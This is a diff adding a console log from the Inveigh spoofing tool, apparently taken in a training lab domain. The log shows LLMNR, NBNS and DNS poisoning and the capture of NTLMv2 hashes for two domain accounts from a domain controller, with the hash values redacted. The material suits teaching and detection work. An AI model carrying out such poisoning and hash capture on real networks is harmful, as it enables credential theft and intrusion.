@@ -1,0 +1,135 @@
+[*] Inveigh 1.506 started at 2026-05-01T19:37:42
+[+] Elevated Privilege Mode = Enabled
+[+] Primary IP Address = 172.16.7.50
+[+] Spoofer IP Address = 172.16.7.50
+[+] ADIDNS Spoofer = Disabled
+[+] DNS Spoofer = Enabled
+[+] DNS TTL = 30 Seconds
+[+] LLMNR Spoofer = Enabled
+[+] LLMNR TTL = 30 Seconds
+[+] mDNS Spoofer = Disabled
+[+] NBNS Spoofer For Types 00,20 = Enabled
+[+] NBNS TTL = 165 Seconds
+[+] SMB Capture = Enabled
+[+] HTTP Capture = Enabled
+[+] HTTPS Capture = Disabled
+[+] HTTP/HTTPS Authentication = NTLM
+[+] WPAD Authentication = NTLM
+[+] WPAD NTLM Authentication Ignore List = Firefox
+[+] WPAD Response = Enabled
+[+] Kerberos TGT Capture = Disabled
+[+] Machine Account Capture = Disabled
+[+] Console Output = Full
+[+] File Output = Enabled
+[+] Output Directory = C:\Users\Administrator\Documents
+[+] Run Time = 10 Minutes
+[!] Run Stop-Inveigh to stop
+[*] Press any key to stop console output
+[+] [2026-05-01T19:38:24] DNS request for settings-win.data.microsoft.com sent to 172.16.7.3 [outgoing query]
+[+] [2026-05-01T19:38:24] DNS request for settings-win.data.microsoft.com sent to 172.16.7.3 [outgoing query]
+[+] [2026-05-01T19:38:25] DNS request for settings-win.data.microsoft.com sent to 172.16.7.3 [outgoing query]
+[+] [2026-05-01T19:38:27] DNS request for settings-win.data.microsoft.com sent to 172.16.7.3 [outgoing query]
+[+] [2026-05-01T19:38:31] DNS request for settings-win.data.microsoft.com sent to 172.16.7.3 [outgoing query]
+[+] [2026-05-01T19:38:34] DNS request for settings-win.data.microsoft.com sent to 172.16.7.3 [outgoing query]
+[+] [2026-05-01T19:38:34] DNS request for settings-win.data.microsoft.com sent to 172.16.7.3 [outgoing query]
+[+] [2026-05-01T19:38:35] DNS request for settings-win.data.microsoft.com sent to 172.16.7.3 [outgoing query]
+[+] [2026-05-01T19:38:37] DNS request for settings-win.data.microsoft.com sent to 172.16.7.3 [outgoing query]
+[+] [2026-05-01T19:38:41] DNS request for settings-win.data.microsoft.com sent to 172.16.7.3 [outgoing query]
+[+] [2026-05-01T19:39:12] TCP(445) SYN packet detected from 172.16.7.3:50311
+[+] [2026-05-01T19:39:12] SMB(445) negotiation request detected from 172.16.7.3:50311
+[+] [2026-05-01T19:39:12] Domain mapping added for INLANEFREIGHT to INLANEFREIGHT.LOCAL
+[+] [2026-05-01T19:39:12] SMB(445) NTLM challenge 4D5EB07A0D6D4242 sent to 172.16.7.3:50311
+[+] [2026-05-01T19:39:13] SMB(445) NTLMv2 captured for INLANEFREIGHT\CT059 from 172.16.7.3(DC01):50311:
+[redacted]
+[!] [2026-05-01T19:39:13] SMB(445) NTLMv2 written to Inveigh-NTLMv2.txt
+[+] [2026-05-01T19:39:13] TCP(445) SYN packet detected from 172.16.7.3:50312
+[+] [2026-05-01T19:39:13] SMB(445) negotiation request detected from 172.16.7.3:50312
+[+] [2026-05-01T19:39:13] TCP(445) SYN packet detected from 172.16.7.3:50313
+[+] [2026-05-01T19:39:13] SMB(445) negotiation request detected from 172.16.7.3:50313
+[+] [2026-05-01T19:39:13] TCP(445) SYN packet detected from 172.16.7.3:50314
+[+] [2026-05-01T19:39:13] SMB(445) negotiation request detected from 172.16.7.3:50314
+[+] [2026-05-01T19:39:13] SMB(445) NTLM challenge B51614CAC0D310FC sent to 172.16.7.3:50312
+[+] [2026-05-01T19:39:13] SMB(445) NTLMv2 captured for INLANEFREIGHT\CT059 from 172.16.7.3(DC01):50312:
+[not unique]
+[+] [2026-05-01T19:39:13] SMB(445) NTLM challenge C398A926AFDC914B sent to 172.16.7.3:50313
+[+] [2026-05-01T19:39:13] SMB(445) NTLMv2 captured for INLANEFREIGHT\CT059 from 172.16.7.3(DC01):50313:
+[not unique]
+[+] [2026-05-01T19:39:13] SMB(445) NTLM challenge C2B240A93899557D sent to 172.16.7.3:50314
+[+] [2026-05-01T19:39:13] SMB(445) NTLMv2 captured for INLANEFREIGHT\CT059 from 172.16.7.3(DC01):50314:
+[not unique]
+[+] [2026-05-01T19:39:22] NBNS request for INLANEFRIGHT<20> received from 172.16.7.3 [response sent]
+[+] [2026-05-01T19:39:22] mDNS(QM) request INLANEFRIGHT.LOCAL received from 172.16.7.3 [spoofer disabled]
+[+] [2026-05-01T19:39:22] mDNS(QM) request INLANEFRIGHT.LOCAL received from 172.16.7.3 [spoofer disabled]
+[+] [2026-05-01T19:39:22] LLMNR request for INLANEFRIGHT received from 172.16.7.3 [response sent]
+[+] [2026-05-01T19:39:23] TCP(445) SYN packet detected from 172.16.7.3:50319
+[+] [2026-05-01T19:39:23] SMB(445) negotiation request detected from 172.16.7.3:50319
+[+] [2026-05-01T19:39:23] SMB(445) NTLM challenge E58420C01EEE133E sent to 172.16.7.3:50319
+[+] [2026-05-01T19:39:23] SMB(445) NTLMv2 captured for INLANEFREIGHT\AB920 from 172.16.7.3(DC01):50319:
+[redacted]
+[!] [2026-05-01T19:39:23] SMB(445) NTLMv2 written to Inveigh-NTLMv2.txt
+[+] [2026-05-01T19:39:23] TCP(445) SYN packet detected from 172.16.7.3:50320
+[+] [2026-05-01T19:39:23] TCP(445) SYN packet detected from 172.16.7.3:50321
+[+] [2026-05-01T19:39:23] SMB(445) negotiation request detected from 172.16.7.3:50320
+[+] [2026-05-01T19:39:23] TCP(445) SYN packet detected from 172.16.7.3:50322
+[+] [2026-05-01T19:39:23] SMB(445) negotiation request detected from 172.16.7.3:50321
+[+] [2026-05-01T19:39:23] SMB(445) negotiation request detected from 172.16.7.3:50322
+[+] [2026-05-01T19:39:23] SMB(445) NTLM challenge 7CEE2CD9BF2F8CD6 sent to 172.16.7.3:50320
+[+] [2026-05-01T19:39:23] SMB(445) NTLMv2 captured for INLANEFREIGHT\AB920 from 172.16.7.3(DC01):50320:
+[not unique]
+[+] [2026-05-01T19:39:23] SMB(445) NTLM challenge A0A18C490BEF7D8B sent to 172.16.7.3:50321
+[+] [2026-05-01T19:39:23] SMB(445) NTLMv2 captured for INLANEFREIGHT\AB920 from 172.16.7.3(DC01):50321:
+[not unique]
+[+] [2026-05-01T19:39:23] SMB(445) NTLM challenge 228BD24CFAF4470C sent to 172.16.7.3:50322
+[+] [2026-05-01T19:39:23] SMB(445) NTLMv2 captured for INLANEFREIGHT\AB920 from 172.16.7.3(DC01):50322:
+[not unique]
+[+] [2026-05-01T19:39:39] TCP(5985) SYN packet detected from 172.16.7.240:40994
+[+] [2026-05-01T19:39:39] TCP(5985) SYN packet detected from 172.16.7.240:40996
+[+] [2026-05-01T19:39:54] TCP(5985) SYN packet detected from 172.16.7.240:40998
+[+] [2026-05-01T19:39:54] TCP(5985) SYN packet detected from 172.16.7.240:41000
+[+] [2026-05-01T19:40:04] DNS request for wpad.INLANEFREIGHT.LOCAL sent to 172.16.7.3 [outgoing query]
+[+] [2026-05-01T19:40:20] SMB(49739) outgoing negotiation request detected to 172.16.7.3:445
+[+] [2026-05-01T19:40:20] SMB(49739) outgoing authentication method is Kerberos to 172.16.7.3:445
+[+] [2026-05-01T19:41:12] TCP(445) SYN packet detected from 172.16.7.3:50325
+[+] [2026-05-01T19:41:12] SMB(445) negotiation request detected from 172.16.7.3:50325
+[+] [2026-05-01T19:41:12] SMB(445) NTLM challenge 4D7945F5F2E672EE sent to 172.16.7.3:50325
+[+] [2026-05-01T19:41:12] SMB(445) NTLMv2 captured for INLANEFREIGHT\CT059 from 172.16.7.3(DC01):50325:
+[not unique]
+[+] [2026-05-01T19:41:12] TCP(445) SYN packet detected from 172.16.7.3:50326
+[+] [2026-05-01T19:41:12] SMB(445) negotiation request detected from 172.16.7.3:50326
+[+] [2026-05-01T19:41:12] TCP(445) SYN packet detected from 172.16.7.3:50327
+[+] [2026-05-01T19:41:12] SMB(445) negotiation request detected from 172.16.7.3:50327
+[+] [2026-05-01T19:41:12] TCP(445) SYN packet detected from 172.16.7.3:50328
+[+] [2026-05-01T19:41:12] SMB(445) negotiation request detected from 172.16.7.3:50328
+[+] [2026-05-01T19:41:12] SMB(445) NTLM challenge 0BFB47B889D0A11C sent to 172.16.7.3:50326
+[+] [2026-05-01T19:41:12] SMB(445) NTLM challenge 4BB90B0347378DEC sent to 172.16.7.3:50328
+[+] [2026-05-01T19:41:12] SMB(445) NTLMv2 captured for INLANEFREIGHT\CT059 from 172.16.7.3(DC01):50326:
+[not unique]
+[+] [2026-05-01T19:41:12] SMB(445) NTLM challenge 93AF23675105FD74 sent to 172.16.7.3:50327
+[+] [2026-05-01T19:41:12] SMB(445) NTLMv2 captured for INLANEFREIGHT\CT059 from 172.16.7.3(DC01):50328:
+[not unique]
+[+] [2026-05-01T19:41:12] SMB(445) NTLMv2 captured for INLANEFREIGHT\CT059 from 172.16.7.3(DC01):50327:
+[not unique]
+[+] [2026-05-01T19:41:22] mDNS(QM) request INLANEFRIGHT.LOCAL received from 172.16.7.3 [spoofer disabled]
+[+] [2026-05-01T19:41:22] mDNS(QM) request INLANEFRIGHT.LOCAL received from 172.16.7.3 [spoofer disabled]
+[+] [2026-05-01T19:41:22] LLMNR request for INLANEFRIGHT received from 172.16.7.3 [response sent]
+[+] [2026-05-01T19:41:23] TCP(445) SYN packet detected from 172.16.7.3:50329
+[+] [2026-05-01T19:41:23] SMB(445) negotiation request detected from 172.16.7.3:50329
+[+] [2026-05-01T19:41:23] SMB(445) NTLM challenge 2358F3798C17AB1C sent to 172.16.7.3:50329
+[+] [2026-05-01T19:41:23] SMB(445) NTLMv2 captured for INLANEFREIGHT\AB920 from 172.16.7.3(DC01):50329:
+[not unique]
+[+] [2026-05-01T19:41:23] TCP(445) SYN packet detected from 172.16.7.3:50330
+[+] [2026-05-01T19:41:23] TCP(445) SYN packet detected from 172.16.7.3:50331
+[+] [2026-05-01T19:41:23] SMB(445) negotiation request detected from 172.16.7.3:50330
+[+] [2026-05-01T19:41:23] TCP(445) SYN packet detected from 172.16.7.3:50332
+[+] [2026-05-01T19:41:23] SMB(445) negotiation request detected from 172.16.7.3:50331
+[+] [2026-05-01T19:41:23] SMB(445) negotiation request detected from 172.16.7.3:50332
+[+] [2026-05-01T19:41:23] SMB(445) NTLM challenge BA5F1C879D251D23 sent to 172.16.7.3:50330
+[+] [2026-05-01T19:41:23] SMB(445) NTLM challenge 0F5AF9A11A33E38E sent to 172.16.7.3:50331
+[+] [2026-05-01T19:41:23] SMB(445) NTLMv2 captured for INLANEFREIGHT\AB920 from 172.16.7.3(DC01):50330:
+[not unique]
+[+] [2026-05-01T19:41:23] SMB(445) NTLMv2 captured for INLANEFREIGHT\AB920 from 172.16.7.3(DC01):50331:
+[not unique]
+[+] [2026-05-01T19:41:23] SMB(445) NTLM challenge D753BDBEC589BD1D sent to 172.16.7.3:50332
+[+] [2026-05-01T19:41:23] SMB(445) NTLMv2 captured for INLANEFREIGHT\AB920 from 172.16.7.3(DC01):50332:
+[not unique]
+[+] [2026-05-01T19:42:06] TCP(5985) SYN packet detected from 172.16.7.240:41002
